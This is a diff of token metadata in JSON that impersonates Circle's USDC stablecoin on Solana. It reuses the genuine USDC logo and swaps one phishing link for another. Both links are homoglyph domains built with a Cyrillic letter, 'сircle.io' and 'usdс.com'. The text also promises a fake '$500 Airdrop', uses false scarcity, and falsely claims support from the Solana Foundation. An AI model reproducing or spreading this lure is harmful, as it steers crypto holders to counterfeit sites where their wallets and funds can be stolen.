@@ -1,12 +1,12 @@
 {
     "name": "USDC (USDC)",
     "symbol": "USDC",
-    "description": "USDC by Circle. Best stablecoin on Solana with $500 Airdrop only $600 worth of airdrops remaining. Confirm at https://сircle.io",
+    "description": "USDC by Circle. Best stablecoin on Solana with $500 Airdrop only $600 worth of airdrops remaining. Confirm at  https://usdс.com",
     "image": "https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v/logo.png",
     "attributes": [
       {
         "trait_type": "Item",
-        "value": "$500 Airdrop. Confirm at https://сircle.io . Supported by the Solana Foundation."
+        "value": "$500 Airdrop. Confirm at https://usdс.com . Supported by the Solana Foundation."
       }
     ]
   }
